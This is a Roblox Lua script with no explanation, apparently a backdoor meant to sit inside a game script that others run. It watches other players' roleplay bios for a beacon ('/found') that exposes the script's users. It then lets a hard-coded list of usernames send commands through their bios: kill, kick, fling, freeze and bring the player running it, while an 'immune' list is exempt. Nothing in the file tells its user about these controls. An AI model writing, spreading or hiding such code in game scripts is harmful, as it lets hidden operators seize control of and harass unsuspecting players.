local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Remote = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1RPNam1eTex1t")

local triggered = false

local function onRPBioChanged(player, value)
	if triggered then return end
	if value == "/found" then
		triggered = true

		local args1 = {
			"RolePlayBio",
			"MiDe7moZ"
		}
		Remote:FireServer(unpack(args1))

	
		task.delay(1, function()
			local args2 = {
				"RolePlayBio",
				""
			}
			Remote:FireServer(unpack(args2))


			task.delay(0.5, function()
				triggered = false
			end)
		end)
	end
end

local function watchPlayer(player)
	local bag = player:WaitForChild("PlayersBag", 10)
	if not bag then return end

	local rpBio = bag:WaitForChild("RPBio", 10)
	if not rpBio then return end

	onRPBioChanged(player, rpBio.Value)

	rpBio:GetPropertyChangedSignal("Value"):Connect(function()
		onRPBioChanged(player, rpBio.Value)
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	watchPlayer(player)
end

Players.PlayerAdded:Connect(function(player)
	watchPlayer(player)
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local immuneLocals = {Sajwaad=true, ghalidev_0=true, ADJ_71=true, Daemon=true}
if immuneLocals[LocalPlayer.Name] then return end

local monitoredPlayers = {
    Sajwaad = true,
    alskndrany91 = true,
    imane_pink54 = true,
    K_31387 = true,
    haker_457230 = true,
    IV_SEE = true,
    rengoku28306 = true,
    ghalidev_0 = true,
    iskeowa = true,
    wkwjdnsnsndnxxnsnsn = true,
    ADJ_71 = true,
    FHG_12343 = true,
    talarom12349 = true,
    XXTAJXX63 = true,
    HUSAM1438 = true,
    yew99yew = true
}
local myNameLower = string.lower(LocalPlayer.Name)
local myNamePrefix = string.sub(myNameLower, 1, 3)

local function getChar() return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() end
local function getHRP() return getChar():WaitForChild("HumanoidRootPart") end

local FAR_POS = Vector3.new(999999999,999999999,999999999)
_G.__FLUNG=false
_G.__FLING_ORIGIN=nil
local function doFling()
	if _G.__FLUNG then return end
	local hrp=getHRP()
	_G.__FLING_ORIGIN=hrp.CFrame
	_G.__FLUNG=true
	hrp.CFrame=CFrame.new(FAR_POS)
end
local function doUnFling()
	if not _G.__FLUNG or not _G.__FLING_ORIGIN then return end
	getHRP().CFrame=_G.__FLING_ORIGIN
	_G.__FLUNG=false
end

_G.__ULTIMATE_FREEZE_ACTIVE=false
_G.__FREEZE_CONNECTIONS={}
local savedHumanoid={}

local function ultimateFreeze(char)
	if _G.__ULTIMATE_FREEZE_ACTIVE then return end
	_G.__ULTIMATE_FREEZE_ACTIVE=true
	local hrp=char:WaitForChild("HumanoidRootPart")
	local hum=char:WaitForChild("Humanoid")
	if not savedHumanoid.WalkSpeed then
		savedHumanoid={WalkSpeed=hum.WalkSpeed,JumpPower=hum.JumpPower,JumpHeight=hum.JumpHeight,AutoRotate=hum.AutoRotate,PlatformStand=hum.PlatformStand}
	end
	hrp.Anchored=true
	hum.PlatformStand=true
	hum.AutoRotate=false
	hum.WalkSpeed=0
	hum.JumpPower=0
	hum.JumpHeight=0
	table.insert(_G.__FREEZE_CONNECTIONS,RunService.RenderStepped:Connect(function()
		if not _G.__ULTIMATE_FREEZE_ACTIVE then return end
		hrp.Velocity=Vector3.zero
		hrp.RotVelocity=Vector3.zero
	end))
	table.insert(_G.__FREEZE_CONNECTIONS,LocalPlayer.CharacterAdded:Connect(function(c)
		task.wait(0.15)
		if _G.__ULTIMATE_FREEZE_ACTIVE then ultimateFreeze(c) else c:Disconnect() end
	end))
end

local function ultimateUnFreeze()
	_G.__ULTIMATE_FREEZE_ACTIVE=false
	for _,c in ipairs(_G.__FREEZE_CONNECTIONS) do pcall(function() c:Disconnect() end) end
	_G.__FREEZE_CONNECTIONS={}
	local char=getChar()
	local hrp=char:WaitForChild("HumanoidRootPart")
	local hum=char:WaitForChild("Humanoid")
	hrp.Anchored=false
	hrp.Velocity=Vector3.zero
	hrp.RotVelocity=Vector3.zero
	hum.PlatformStand=false
	hum.AutoRotate=true
	for _,state in ipairs(Enum.HumanoidStateType:GetEnumItems()) do hum:SetStateEnabled(state,true) end
	hum.WalkSpeed=savedHumanoid.WalkSpeed or 16
	hum.JumpPower=savedHumanoid.JumpPower or 50
	hum.JumpHeight=savedHumanoid.JumpHeight or 7.2
	hum:ChangeState(Enum.HumanoidStateType.GettingUp)
	task.wait(0.05)
	hum:ChangeState(Enum.HumanoidStateType.Landed)
	task.wait(0.05)
	hum:ChangeState(Enum.HumanoidStateType.Running)
	hrp.CFrame=hrp.CFrame+Vector3.new(0,0.05,0)
end

local function executeCommand(cmd,fromPlayer)
	cmd=string.lower(cmd)
	if cmd=="/kill all" or (cmd:sub(1,5)=="/kill" and cmd:find(myNamePrefix,6,true)) then getChar():BreakJoints() end
	if cmd=="/kick all" or (cmd:sub(1,5)=="/kick" and cmd:find(myNamePrefix,6,true)) then LocalPlayer:Kick("تم طردك") end
	if cmd=="/bring all" or (cmd:sub(1,6)=="/bring" and cmd:find(myNamePrefix,7,true)) then
		if fromPlayer.Character and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
			getHRP().CFrame=fromPlayer.Character.HumanoidRootPart.CFrame
		end
	end
	if cmd=="/fling all" or (cmd:sub(1,6)=="/fling" and cmd:find(myNamePrefix,7,true)) then doFling() end
	if cmd=="/unfling all" or (cmd:sub(1,8)=="/unfling" and cmd:find(myNamePrefix,9,true)) then doUnFling() end
	if cmd=="/freeze all" or (cmd:sub(1,7)=="/freeze" and cmd:find(myNamePrefix,8,true)) then ultimateFreeze(getChar()) end
	if cmd=="/unfreeze all" or (cmd:sub(1,9)=="/unfreeze" and cmd:find(myNamePrefix,10,true)) then ultimateUnFreeze() end
end

local function monitorPlayer(plr)
	if not monitoredPlayers[plr.Name] or plr==LocalPlayer then return end
	local bag=plr:WaitForChild("PlayersBag",10)
	if not bag then return end
	local bio=bag:WaitForChild("RPBio",10)
	if not bio or not bio:IsA("StringValue") then return end
	executeCommand(bio.Value,plr)
	bio:GetPropertyChangedSignal("Value"):Connect(function() executeCommand(bio.Value,plr) end)
end

for _,p in ipairs(Players:GetPlayers()) do monitorPlayer(p) end
Players.PlayerAdded:Connect(function(p) p.CharacterAdded:Wait() monitorPlayer(p) end)
